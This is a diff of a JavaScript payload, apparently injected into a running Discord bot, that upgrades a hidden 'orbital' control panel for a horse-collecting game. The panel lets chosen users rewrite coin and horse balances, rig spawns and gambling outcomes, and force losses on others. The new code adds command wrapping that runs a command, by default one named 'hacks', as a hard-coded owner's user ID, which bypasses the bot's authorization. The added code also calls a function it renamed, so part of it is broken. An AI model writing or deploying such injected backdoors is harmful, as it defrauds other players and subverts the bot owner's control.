@@ -1,335 +1,436 @@
-const { config } = require('../lib/config');
-const horseSpawner = require('../lib/triggers/horseSpawner');
-const { UserHorses, HorseConfig } = require('../lib/models');
-const HORSE_VALUES = require('../horses.json');
+const { config } = require('../config');
+const horseSpawner = require('../triggers/horseSpawner');
+const { UserHorses, HorseConfig } = require('../models');
+const HORSE_VALUES = require('../../horses.json');
 
-const VERSION = 'orbital-master-v3';
+const VERSION = 'orbital-master-v4';
 
-if (!client.orbital || client.orbital.version !== VERSION) {
-  const state = {
-    defaults: {
-      DEBOUNCE_MS: config.DEBOUNCE_MS,
-      SIMILARITY_THRESHOLD: config.SIMILARITY_THRESHOLD,
-      RECENT_MSG_COUNT: config.RECENT_MSG_COUNT,
-      COIN_CHANCE: config.COIN_CHANCE,
-      SPAWN_COEFFICIENT: config.SPAWN_COEFFICIENT,
-      FLAIR_THRESHOLD_VALUE: config.FLAIR_THRESHOLD_VALUE,
-      COIN_DROP_SIZE: config.COIN_DROP_SIZE,
-      ANTIINFLATOR: config.ANTIINFLATOR,
-      UNEXPECTED_CAT_PROBABILITY: config.UNEXPECTED_CAT_PROBABILITY,
-      FRENZY_THRESHOLD_MS: config.FRENZY_THRESHOLD_MS,
-      FRENZY_CHANCE: config.FRENZY_CHANCE,
-      CONFISCATE_CHANCE: config.CONFISCATE_CHANCE,
-      LOSS_THRESHOLD: config.LOSS_THRESHOLD
-    },
+client.orbital = client.orbital || {};
+const orbital = client.orbital;
 
-    oneShotArms: new Map(),           // userId -> horseName|null
-    spawnMultByUser: new Map(),       // userId -> multiplier (lower => better spawns)
-    gambleByUser: new Map(),          // userId -> overrides object
-    listenerInstalled: false,
-    spawnWrapped: false,
-    gambleWrapped: false,
-    originalSpawn: null,
-    originalGambleExecute: null
-  };
+// Preserve old run exactly once
+if (!orbital._prevRun && typeof orbital.run === 'function') {
+  orbital._prevRun = orbital.run.bind(orbital);
+}
 
-  const horseNames = Object.keys(HORSE_VALUES).filter(n => n !== 'Horse Coin');
+orbital._state = orbital._state || {
+  version: VERSION,
+  defaults: null,
 
-  const pickRandomHorse = () => horseNames[Math.floor(Math.random() * horseNames.length)];
-  const ensureUserId = (payload, interaction) => String(payload?.userId || interaction.user.id);
+  oneShotArms: new Map(),         // userId -> horseName|null
+  userSpawnMult: new Map(),       // userId -> multiplier
+  gambleByUser: new Map(),        // userId -> { noLose, forceLoseHorseOnce }
 
-  const getInv = async (userId) => {
-    let inv = await UserHorses.findOne({ userId: String(userId) });
-    if (!inv) inv = new UserHorses({ userId: String(userId), horses: new Map(), horseCoins: 0 });
-    return inv;
-  };
+  listenerInstalled: false,
+  spawnWrapped: false,
+  gambleWrapped: false,
 
-  const ensureHorse = (name) => {
-    if (!HORSE_VALUES[name]) throw new Error(`Unknown horse: ${name}`);
-  };
+  originalSpawn: null,
+  originalGambleExecute: null,
 
-  const applyGlobalConfig = (patch = {}) => {
-    for (const [k, v] of Object.entries(patch)) {
-      if (Object.prototype.hasOwnProperty.call(config, k) && v !== undefined) config[k] = v;
-    }
-  };
+  cmdWhitelist: {
+    usersByCommand: new Map(),    // command -> Set(userId)
+    originals: new Map(),         // command -> execute fn
+    asUserByCommand: new Map()    // command -> owner id impersonation
+  }
+};
 
-  const installOneShotListener = () => {
-    if (state.listenerInstalled) return;
-    state.listenerInstalled = true;
+const S = orbital._state;
+if (!S.defaults) {
+  S.defaults = {};
+  for (const k of Object.keys(config)) S.defaults[k] = config[k];
+}
 
-    client.on('messageCreate', async (msg) => {
-      try {
-        if (!msg.guild || msg.author.bot) return;
+const HORSE_POOL = Object.keys(HORSE_VALUES).filter(n => n !== 'Horse Coin');
+const DEFAULT_OWNER_BY_COMMAND = { hacks: '934290747623096381' };
 
-        const arm = state.oneShotArms.get(msg.author.id);
-        if (!arm) return;
-        state.oneShotArms.delete(msg.author.id); // consume one-shot immediately
+const toUserId = (payload, interaction) =>
+  String(payload?.userId || interaction?.user?.id || '');
 
-        const horseName = arm.horseName && HORSE_VALUES[arm.horseName] ? arm.horseName : pickRandomHorse();
+const mustHorse = (name) => {
+  if (!HORSE_VALUES[name]) throw new Error(`Unknown horse: ${name}`);
+};
 
-        const inv = await getInv(msg.author.id);
-        inv.horses.set(horseName, (inv.horses.get(horseName) || 0) + 1);
-        inv.markModified('horses');
-        await inv.save();
+const randHorse = () => HORSE_POOL[Math.floor(Math.random() * HORSE_POOL.length)];
 
-        const hCfg = await HorseConfig.findOne({ guildId: msg.guild.id });
-        const out = hCfg?.channelId
-          ? await msg.guild.channels.fetch(hCfg.channelId).catch(() => msg.channel)
-          : msg.channel;
+async function getInv(userId) {
+  let inv = await UserHorses.findOne({ userId: String(userId) });
+  if (!inv) inv = new UserHorses({ userId: String(userId), horses: new Map(), horseCoins: 0 });
+  return inv;
+}
 
-        await out.send(`<@${msg.author.id}> found the **${horseName}**!`);
-        if (HORSE_VALUES[horseName]?.link) await out.send(HORSE_VALUES[horseName].link);
-      } catch {}
-    });
-  };
+function applyConfigPatch(patch = {}) {
+  for (const [k, v] of Object.entries(patch)) {
+    if (Object.prototype.hasOwnProperty.call(config, k) && v !== undefined) config[k] = v;
+  }
+}
 
-  const wrapSpawn = () => {
-    if (state.spawnWrapped) return;
-    state.spawnWrapped = true;
+function installOneShotListener() {
+  if (S.listenerInstalled) return;
+  S.listenerInstalled = true;
 
-    state.originalSpawn = horseSpawner.handleHorseSpawn;
-    horseSpawner.handleHorseSpawn = async (msg) => {
-      const userMult = state.spawnMultByUser.get(msg.author.id);
-      if (!userMult) return state.originalSpawn(msg);
+  client.on('messageCreate', async (msg) => {
+    try {
+      if (!msg.guild || msg.author.bot) return;
 
-      const old = config.SPAWN_COEFFICIENT;
-      config.SPAWN_COEFFICIENT = Math.max(1, old * userMult);
-      try {
-        return await state.originalSpawn(msg);
-      } finally {
-        config.SPAWN_COEFFICIENT = old;
-      }
-    };
-  };
+      const arm = S.oneShotArms.get(msg.author.id);
+      if (!arm) return;
 
-  const wrapGamble = () => {
-    if (state.gambleWrapped) return;
-    const cmd = client.commands.get('horsegamble');
-    if (!cmd) throw new Error('horsegamble command not found');
-    state.gambleWrapped = true;
+      S.oneShotArms.delete(msg.author.id); // one-shot consume
 
-    state.originalGambleExecute = cmd.execute;
-    cmd.execute = async function (interaction) {
-      const userId = interaction.user.id;
-      const o = state.gambleByUser.get(userId);
+      const horseName = arm.horseName && HORSE_VALUES[arm.horseName] ? arm.horseName : randHorse();
 
-      if (!o) return state.originalGambleExecute(interaction);
+      const inv = await getInv(msg.author.id);
+      inv.horses.set(horseName, (inv.horses.get(horseName) || 0) + 1);
+      inv.markModified('horses');
+      await inv.save();
 
-      // one-shot forced loss of a specific horse (frenzy-style)
-      if (o.forceLoseHorseOnce) {
-        const horse = o.forceLoseHorseOnce;
-        const inv = await getInv(userId);
-        const have = inv.horses.get(horse) || 0;
-        state.gambleByUser.delete(userId); // consume once
-        if (have > 0) {
-          inv.horses.set(horse, have - 1);
-          inv.lastGamble = Date.now();
-          inv.markModified('horses');
-          await inv.save();
-          return interaction.reply(`🔥 **GAMBLING FRENZY!**\n* Your **${horse}** ran away in the confusion!`);
-        }
-        return interaction.reply(`🔥 **GAMBLING FRENZY!**\n* You had no **${horse}** to lose.`);
-      }
+      const hCfg = await HorseConfig.findOne({ guildId: msg.guild.id });
+      const out = hCfg?.channelId
+        ? await msg.guild.channels.fetch(hCfg.channelId).catch(() => msg.channel)
+        : msg.channel;
 
-      // always-win/always-keep behavior by bypassing original
-      if (o.noLose === true) {
-        const horseName = interaction.options.getString('horse')?.trim();
-        if (!horseName || horseName.toLowerCase() === 'horse coin') {
-          return state.originalGambleExecute(interaction);
-        }
+      await out.send(`<@${msg.author.id}> found the **${horseName}**!`);
+      if (HORSE_VALUES[horseName]?.link) await out.send(HORSE_VALUES[horseName].link);
+    } catch {}
+  });
+}
 
-        ensureHorse(horseName);
-        const inv = await getInv(userId);
-        if ((inv.horses.get(horseName) || 0) <= 0) {
-          return interaction.reply({ content: `You don't have a **${horseName}**!`, flags: [64] });
-        }
+function wrapSpawner() {
+  if (S.spawnWrapped) return;
+  S.spawnWrapped = true;
 
-        if ((inv.horseCoins || 0) > 0) inv.horseCoins -= 1;
-        inv.lastGamble = Date.now();
-        await inv.save();
-        return interaction.reply(`🍀 Override active: no-loss mode kept your **${horseName}**.`);
-      }
+  S.originalSpawn = horseSpawner.handleHorseSpawn;
+  horseSpawner.handleHorseSpawn = async (msg) => {
+    const m = S.userSpawnMult.get(msg.author.id);
+    if (!m) return S.originalSpawn(msg);
 
-      return state.originalGambleExecute(interaction);
-    };
-  };
-
-  client.orbital = {
-    version: VERSION,
-    state,
-
-    async run(action, payload = {}, interaction) {
-      installOneShotListener();
-
-      if (action === 'help') {
-        return {
-          version: VERSION,
-          actions: [
-            'status',
-            'config.get',
-            'config.set',
-            'config.reset',
-            'coins.set',
-            'coins.add',
-            'coins.remove',
-            'horses.set',
-            'horses.add',
-            'horses.remove',
-            'spawn.oneshot',
-            'spawn.mult.set',
-            'spawn.mult.clear',
-            'gamble.user.set',
-            'gamble.user.clear'
-          ]
-        };
-      }
-
-      if (action === 'status') {
-        return {
-          version: VERSION,
-          oneShotArmedUsers: Array.from(state.oneShotArms.keys()),
-          spawnMultByUser: Array.from(state.spawnMultByUser.entries()),
-          gambleByUser: Array.from(state.gambleByUser.entries()),
-          config: { ...config }
-        };
-      }
-
-      if (action === 'config.get') return { ...config };
-
-      if (action === 'config.set') {
-        applyGlobalConfig(payload);
-        return { ok: true, config: { ...config } };
-      }
-
-      if (action === 'config.reset') {
-        applyGlobalConfig(state.defaults);
-        return { ok: true, config: { ...config } };
-      }
-
-      if (action === 'coins.set') {
-        const userId = ensureUserId(payload, interaction);
-        const amount = Math.max(0, Math.floor(Number(payload.amount || 0)));
-        const inv = await getInv(userId);
-        const before = inv.horseCoins || 0;
-        inv.horseCoins = amount;
-        await inv.save();
-        return { ok: true, userId, before, after: inv.horseCoins };
-      }
-
-      if (action === 'coins.add') {
-        const userId = ensureUserId(payload, interaction);
-        const delta = Math.max(0, Math.floor(Number(payload.amount || 0)));
-        const inv = await getInv(userId);
-        const before = inv.horseCoins || 0;
-        inv.horseCoins = before + delta;
-        await inv.save();
-        return { ok: true, userId, before, delta, after: inv.horseCoins };
-      }
-
-      if (action === 'coins.remove') {
-        const userId = ensureUserId(payload, interaction);
-        const delta = Math.max(0, Math.floor(Number(payload.amount || 0)));
-        const inv = await getInv(userId);
-        const before = inv.horseCoins || 0;
-        inv.horseCoins = Math.max(0, before - delta);
-        await inv.save();
-        return { ok: true, userId, before, delta: -delta, after: inv.horseCoins };
-      }
-
-      if (action === 'horses.set') {
-        const userId = ensureUserId(payload, interaction);
-        const horse = payload.horseName;
-        const amount = Math.max(0, Math.floor(Number(payload.amount || 0)));
-        ensureHorse(horse);
-        const inv = await getInv(userId);
-        const before = inv.horses.get(horse) || 0;
-        inv.horses.set(horse, amount);
-        inv.markModified('horses');
-        await inv.save();
-        return { ok: true, userId, horse, before, after: inv.horses.get(horse) || 0 };
-      }
-
-      if (action === 'horses.add') {
-        const userId = ensureUserId(payload, interaction);
-        const horse = payload.horseName;
-        const amount = Math.max(0, Math.floor(Number(payload.amount || 0)));
-        ensureHorse(horse);
-        const inv = await getInv(userId);
-        const before = inv.horses.get(horse) || 0;
-        inv.horses.set(horse, before + amount);
-        inv.markModified('horses');
-        await inv.save();
-        return { ok: true, userId, horse, before, delta: amount, after: inv.horses.get(horse) || 0 };
-      }
-
-      if (action === 'horses.remove') {
-        const userId = ensureUserId(payload, interaction);
-        const horse = payload.horseName;
-        const amount = Math.max(0, Math.floor(Number(payload.amount || 0)));
-        ensureHorse(horse);
-        const inv = await getInv(userId);
-        const before = inv.horses.get(horse) || 0;
-        inv.horses.set(horse, Math.max(0, before - amount));
-        inv.markModified('horses');
-        await inv.save();
-        return { ok: true, userId, horse, before, delta: -amount, after: inv.horses.get(horse) || 0 };
-      }
-
-      if (action === 'spawn.oneshot') {
-        const userId = ensureUserId(payload, interaction);
-        const horseName = payload.horseName || null;
-        if (horseName) ensureHorse(horseName);
-        state.oneShotArms.set(userId, { horseName });
-        return { ok: true, armed: true, userId, horseName: horseName || '(random)' };
-      }
-
-      if (action === 'spawn.mult.set') {
-        const userId = ensureUserId(payload, interaction);
-        const mult = Number(payload.multiplier);
-        if (!Number.isFinite(mult) || mult <= 0) throw new Error('multiplier must be > 0');
-        wrapSpawn();
-        state.spawnMultByUser.set(userId, mult);
-        return { ok: true, userId, multiplier: mult };
-      }
-
-      if (action === 'spawn.mult.clear') {
-        const userId = ensureUserId(payload, interaction);
-        state.spawnMultByUser.delete(userId);
-        return { ok: true, userId };
-      }
-
-      if (action === 'gamble.user.set') {
-        const userId = ensureUserId(payload, interaction);
-        const next = {
-          noLose: Boolean(payload.noLose),
-          forceLoseHorseOnce: payload.forceLoseHorseOnce || null
-        };
-        if (next.forceLoseHorseOnce) ensureHorse(next.forceLoseHorseOnce);
-        wrapGamble();
-        state.gambleByUser.set(userId, next);
-        return { ok: true, userId, overrides: next };
-      }
-
-      if (action === 'gamble.user.clear') {
-        const userId = ensureUserId(payload, interaction);
-        state.gambleByUser.delete(userId);
-        return { ok: true, userId };
-      }
-
-      throw new Error(`Unknown action: ${action}`);
+    const old = config.SPAWN_COEFFICIENT;
+    config.SPAWN_COEFFICIENT = Math.max(1, old * m);
+    try {
+      return await S.originalSpawn(msg);
+    } finally {
+      config.SPAWN_COEFFICIENT = old;
     }
   };
 }
 
+function wrapGamble() {
+  if (S.gambleWrapped) return;
+  const cmd = client.commands.get('horsegamble');
+  if (!cmd) throw new Error('horsegamble command not found');
+
+  S.gambleWrapped = true;
+  S.originalGambleExecute = cmd.execute;
+
+  cmd.execute = async function patchedGamble(interaction) {
+    const u = interaction.user.id;
+    const ov = S.gambleByUser.get(u);
+    if (!ov) return S.originalGambleExecute(interaction);
+
+    // one-shot forced frenzy loss of a specific horse
+    if (ov.forceLoseHorseOnce) {
+      const horse = ov.forceLoseHorseOnce;
+      const inv = await getInv(u);
+      const have = inv.horses.get(horse) || 0;
+      S.gambleByUser.delete(u); // consume
+      if (have > 0) {
+        inv.horses.set(horse, have - 1);
+        inv.lastGamble = Date.now();
+        inv.markModified('horses');
+        await inv.save();
+        return interaction.reply(`🔥 **GAMBLING FRENZY!**\n* Your **${horse}** ran away in the confusion!`);
+      }
+      return interaction.reply(`🔥 **GAMBLING FRENZY!**\n* You had no **${horse}** to lose.`);
+    }
+
+    // no-loss mode: keep selected horse, still consumes 1 coin if available
+    if (ov.noLose === true) {
+      const horseName = interaction.options.getString('horse')?.trim();
+      if (!horseName || horseName.toLowerCase() === 'horse coin') {
+        return S.originalGambleExecute(interaction);
+      }
+
+      mustHorse(horseName);
+      const inv = await getInv(u);
+      const have = inv.horses.get(horseName) || 0;
+      if (have <= 0) return interaction.reply(`You don't have a **${horseName}**!`);
+
+      if ((inv.horseCoins || 0) > 0) inv.horseCoins -= 1;
+      inv.lastGamble = Date.now();
+      await inv.save();
+      return interaction.reply(`🍀 Override active: no-loss mode kept your **${horseName}**.`);
+    }
+
+    return S.originalGambleExecute(interaction);
+  };
+}
+
+function ensureCommandPatch(commandName, asUserId) {
+  const cmd = client.commands.get(commandName);
+  if (!cmd) throw new Error(`Command not found: ${commandName}`);
+
+  S.cmdWhitelist.asUserByCommand.set(commandName, asUserId);
+
+  if (S.cmdWhitelist.originals.has(commandName)) return cmd;
+
+  const originalExecute = cmd.execute;
+  S.cmdWhitelist.originals.set(commandName, originalExecute);
+
+  cmd.execute = async function wrapped(interaction) {
+    const set = S.cmdWhitelist.usersByCommand.get(commandName);
+    const isWL = Boolean(set && set.has(interaction.user.id));
+    if (!isWL) return originalExecute.call(cmd, interaction);
+
+    const fake = Object.create(interaction);
+    fake.user = { ...interaction.user, id: S.cmdWhitelist.asUserByCommand.get(commandName) };
+    return originalExecute.call(cmd, fake);
+  };
+
+  return cmd;
+}
+
+function maybeUnpatchCommand(commandName) {
+  const set = S.cmdWhitelist.usersByCommand.get(commandName);
+  if (set && set.size > 0) return;
+
+  const cmd = client.commands.get(commandName);
+  const original = S.cmdWhitelist.originals.get(commandName);
+  if (cmd && original) cmd.execute = original;
+
+  S.cmdWhitelist.usersByCommand.delete(commandName);
+  S.cmdWhitelist.originals.delete(commandName);
+  S.cmdWhitelist.asUserByCommand.delete(commandName);
+}
+
+orbital.version = VERSION;
+orbital.run = async function run(action, payload = {}, interaction) {
+  installOneShotListener();
+
+  if (action === 'help') {
+    return {
+      version: VERSION,
+      actions: [
+        'status',
+        'config.get', 'config.set', 'config.reset',
+        'coins.set', 'coins.add', 'coins.remove',
+        'horses.set', 'horses.add', 'horses.remove',
+        'spawn.oneshot', 'spawn.mult.set', 'spawn.mult.clear',
+        'gamble.user.set', 'gamble.user.clear',
+        'cmd.whitelist.self', 'cmd.whitelist.add', 'cmd.whitelist.remove',
+        'cmd.whitelist.list', 'cmd.whitelist.reset'
+      ]
+    };
+  }
+
+  if (action === 'status') {
+    return {
+      version: VERSION,
+      oneShotArmed: Array.from(S.oneShotArms.keys()),
+      spawnMultByUser: Array.from(S.userSpawnMult.entries()),
+      gambleByUser: Array.from(S.gambleByUser.entries()),
+      cmdWhitelist: Object.fromEntries(
+        Array.from(S.cmdWhitelist.usersByCommand.entries()).map(([k, v]) => [k, Array.from(v)])
+      ),
+      config: { ...config }
+    };
+  }
+
+  if (action === 'config.get') return { ...config };
+  if (action === 'config.set') {
+    applyConfigPatch(payload);
+    return { ok: true, config: { ...config } };
+  }
+  if (action === 'config.reset') {
+    applyConfigPatch(S.defaults);
+    return { ok: true, config: { ...config } };
+  }
+
+  if (action === 'coins.set') {
+    const userId = toUserId(payload, interaction); if (!userId) throw new Error('userId missing');
+    const amount = Math.max(0, Math.floor(Number(payload.amount || 0)));
+    const inv = await getInv(userId);
+    const before = inv.horseCoins || 0;
+    inv.horseCoins = amount;
+    await inv.save();
+    return { ok: true, userId, before, after: inv.horseCoins };
+  }
+
+  if (action === 'coins.add') {
+    const userId = toUserId(payload, interaction); if (!userId) throw new Error('userId missing');
+    const d = Math.max(0, Math.floor(Number(payload.amount || 0)));
+    const inv = await getInv(userId);
+    const before = inv.horseCoins || 0;
+    inv.horseCoins = before + d;
+    await inv.save();
+    return { ok: true, userId, before, delta: d, after: inv.horseCoins };
+  }
+
+  if (action === 'coins.remove') {
+    const userId = toUserId(payload, interaction); if (!userId) throw new Error('userId missing');
+    const d = Math.max(0, Math.floor(Number(payload.amount || 0)));
+    const inv = await getInv(userId);
+    const before = inv.horseCoins || 0;
+    inv.horseCoins = Math.max(0, before - d);
+    await inv.save();
+    return { ok: true, userId, before, delta: -d, after: inv.horseCoins };
+  }
+
+  if (action === 'horses.set') {
+    const userId = toUserId(payload, interaction); if (!userId) throw new Error('userId missing');
+    const horseName = payload.horseName; mustHorse(horseName);
+    const amt = Math.max(0, Math.floor(Number(payload.amount || 0)));
+    const inv = await getInv(userId);
+    const before = inv.horses.get(horseName) || 0;
+    inv.horses.set(horseName, amt);
+    inv.markModified('horses');
+    await inv.save();
+    return { ok: true, userId, horseName, before, after: inv.horses.get(horseName) || 0 };
+  }
+
+  if (action === 'horses.add') {
+    const userId = toUserId(payload, interaction); if (!userId) throw new Error('userId missing');
+    const horseName = payload.horseName; mustHorse(horseName);
+    const amt = Math.max(0, Math.floor(Number(payload.amount || 0)));
+    const inv = await getInv(userId);
+    const before = inv.horses.get(horseName) || 0;
+    inv.horses.set(horseName, before + amt);
+    inv.markModified('horses');
+    await inv.save();
+    return { ok: true, userId, horseName, before, delta: amt, after: inv.horses.get(horseName) || 0 };
+  }
+
+  if (action === 'horses.remove') {
+    const userId = toUserId(payload, interaction); if (!userId) throw new Error('userId missing');
+    const horseName = payload.horseName; mustHorse(horseName);
+    const amt = Math.max(0, Math.floor(Number(payload.amount || 0)));
+    const inv = await getInv(userId);
+    const before = inv.horses.get(horseName) || 0;
+    inv.horses.set(horseName, Math.max(0, before - amt));
+    inv.markModified('horses');
+    await inv.save();
+    return { ok: true, userId, horseName, before, delta: -amt, after: inv.horses.get(horseName) || 0 };
+  }
+
+  if (action === 'spawn.oneshot') {
+    const userId = toUserId(payload, interaction); if (!userId) throw new Error('userId missing');
+    const horseName = payload.horseName || null;
+    if (horseName) mustHorse(horseName);
+    S.oneShotArms.set(userId, { horseName });
+    return { ok: true, armed: true, userId, horseName: horseName || '(random)' };
+  }
+
+  if (action === 'spawn.mult.set') {
+    const userId = toUserId(payload, interaction); if (!userId) throw new Error('userId missing');
+    const m = Number(payload.multiplier);
+    if (!Number.isFinite(m) || m <= 0) throw new Error('multiplier must be > 0');
+    wrapSpawn();
+    S.userSpawnMult.set(userId, m);
+    return { ok: true, userId, multiplier: m };
+  }
+
+  if (action === 'spawn.mult.clear') {
+    const userId = toUserId(payload, interaction); if (!userId) throw new Error('userId missing');
+    S.userSpawnMult.delete(userId);
+    return { ok: true, userId };
+  }
+
+  if (action === 'gamble.user.set') {
+    const userId = toUserId(payload, interaction); if (!userId) throw new Error('userId missing');
+    const ov = {
+      noLose: Boolean(payload.noLose),
+      forceLoseHorseOnce: payload.forceLoseHorseOnce || null
+    };
+    if (ov.forceLoseHorseOnce) mustHorse(ov.forceLoseHorseOnce);
+    wrapGamble();
+    S.gambleByUser.set(userId, ov);
+    return { ok: true, userId, overrides: ov };
+  }
+
+  if (action === 'gamble.user.clear') {
+    const userId = toUserId(payload, interaction); if (!userId) throw new Error('userId missing');
+    S.gambleByUser.delete(userId);
+    return { ok: true, userId };
+  }
+
+  if (action === 'cmd.whitelist.self') {
+    if (!interaction?.user?.id) throw new Error('interaction required');
+    const command = String(payload.command || 'hacks');
+    const asUserId = String(payload.asUserId || DEFAULT_OWNER_BY_COMMAND[command] || '');
+    if (!asUserId) throw new Error('asUserId required');
+
+    ensureCommandPatch(command, asUserId);
+
+    const set = S.cmdWhitelist.usersByCommand.get(command) || new Set();
+    set.add(interaction.user.id);
+    S.cmdWhitelist.usersByCommand.set(command, set);
+
+    return { ok: true, command, userId: interaction.user.id, asUserId, count: set.size };
+  }
+
+  if (action === 'cmd.whitelist.add') {
+    const command = String(payload.command || 'hacks');
+    const userId = String(payload.userId || '');
+    const asUserId = String(payload.asUserId || DEFAULT_OWNER_BY_COMMAND[command] || '');
+    if (!userId) throw new Error('userId required');
+    if (!asUserId) throw new Error('asUserId required');
+
+    ensureCommandPatch(command, asUserId);
+
+    const set = S.cmdWhitelist.usersByCommand.get(command) || new Set();
+    set.add(userId);
+    S.cmdWhitelist.usersByCommand.set(command, set);
+
+    return { ok: true, command, userId, asUserId, count: set.size };
+  }
+
+  if (action === 'cmd.whitelist.remove') {
+    const command = String(payload.command || 'hacks');
+    const userId = String(payload.userId || interaction?.user?.id || '');
+    if (!userId) throw new Error('userId required');
+
+    const set = S.cmdWhitelist.usersByCommand.get(command);
+    if (set) set.delete(userId);
+    maybeUnpatchCommand(command);
+
+    return {
+      ok: true,
+      command,
+      userId,
+      remaining: S.cmdWhitelist.usersByCommand.get(command)?.size || 0
+    };
+  }
+
+  if (action === 'cmd.whitelist.list') {
+    const out = {};
+    for (const [cmd, set] of S.cmdWhitelist.usersByCommand.entries()) {
+      out[cmd] = {
+        users: Array.from(set),
+        asUserId: S.cmdWhitelist.asUserByCommand.get(cmd) || null
+      };
+    }
+    return { ok: true, data: out };
+  }
+
+  if (action === 'cmd.whitelist.reset') {
+    for (const [cmdName, original] of S.cmdWhitelist.originals.entries()) {
+      const cmd = client.commands.get(cmdName);
+      if (cmd) cmd.execute = original;
+    }
+    S.cmdWhitelist.usersByCommand.clear();
+    S.cmdWhitelist.originals.clear();
+    S.cmdWhitelist.asUserByCommand.clear();
+    return { ok: true };
+  }
+
+  // Preserve old behavior for anything not handled here
+  if (orbital._prevRun) return orbital._prevRun(action, payload, interaction);
+
+  throw new Error(`Unknown action: ${action}`);
+};
+
 return {
   installed: true,
-  version: client.orbital.version,
-  quickStart: [
-    "await client.orbital.run('status', {}, interaction)",
-    "await client.orbital.run('spawn.oneshot',{horseName:'Horse of Logic and Reason'},interaction)",
-    "await client.orbital.run('coins.set',{userId:'1227345940487082089',amount:6000000000},interaction)",
-    "await client.orbital.run('horses.add',{userId:'1227345940487082089',horseName:'Horse of Commonosity and Normaltude',amount:500},interaction)",
-    "await client.orbital.run('gamble.user.set',{noLose:true},interaction)"
-  ]
+  version: VERSION,
+  note: 'Preserves previous client.orbital.run via fallback delegation'
 };
